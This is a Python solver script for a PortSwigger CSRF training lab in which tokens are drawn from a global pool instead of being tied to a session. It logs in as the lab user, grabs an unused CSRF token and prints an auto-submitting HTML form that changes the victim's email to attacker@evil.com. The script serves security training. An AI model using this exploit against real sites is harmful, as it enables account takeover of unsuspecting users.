# Lab 04 — CSRF where token is not tied to user session
# PortSwigger: https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session
#
# Vulnerability: CSRF tokens stored in a global pool — any valid token works for any user
# Aim:           Use your own unused token in an exploit against the victim
#
# Technique:
#   Tokens are generated correctly (random) but stored globally, not per-session.
#   Any token in the pool validates for any session.
#
#   This script:
#     1. Logs in as wiener
#     2. Fetches the account page to get a fresh CSRF token
#     3. Does NOT use the token (keeps it "unused" in the pool)
#     4. Prints an exploit form using that token
#
#   When the victim loads the exploit page, their browser submits the form
#   with wiener's unused token → server finds it in the pool → accepts it.
#
#   ⚠  Once a token is used it's consumed from the pool. Do NOT submit the
#      form yourself — grab the token, then immediately use it in the exploit.
#
# Usage: python csrf_lab04.py <url>

import sys
import urllib3
from proxies import proxies
from csrf_utils import (banner, section, make_session, login,
                        get_account_page, get_csrf_from_response,
                        print_box, print_exploit_steps)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

VICTIM_EMAIL = "attacker@evil.com"

if __name__ == "__main__":
    banner()
    section("LAB 04 — CSRF: TOKEN NOT TIED TO USER SESSION")

    if len(sys.argv) != 2:
        print("  Usage: python csrf_lab04.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    # ── Step 1: log in and grab a fresh token WITHOUT using it ───────────────
    print("\n  ── Step 1: log in and grab an unused CSRF token\n")
    if not login(session, url):
        sys.exit(1)

    r = get_account_page(session, url)
    token = get_csrf_from_response(r.text)

    if not token:
        print("  ✘  No CSRF token found on account page")
        sys.exit(1)

    print(f"  ✔  Unused token captured: {token}")
    print(f"  ℹ  NOT submitting a form — keeping this token unused in the pool\n")

    # ── Step 2: build exploit using attacker's own token ─────────────────────
    section("Step 2: Exploit HTML for the exploit server")
    print("  ℹ  This token belongs to wiener's session but will validate")
    print("     against the victim's session — because the pool is global.\n")

    exploit = f"""\
<form method="POST" action="{url}/my-account/change-email">
    <input type="hidden" name="email" value="{VICTIM_EMAIL}">
    <input type="hidden" name="csrf" value="{token}">
</form>
<script>document.forms[0].submit();</script>"""

    print_box("EXPLOIT SERVER BODY", exploit)
    print_exploit_steps()
    print()
    print("  ℹ  The token is valid (it's in the pool) but it's wiener's token,")
    print("     not the victim's. The server doesn't check ownership → accepted.")
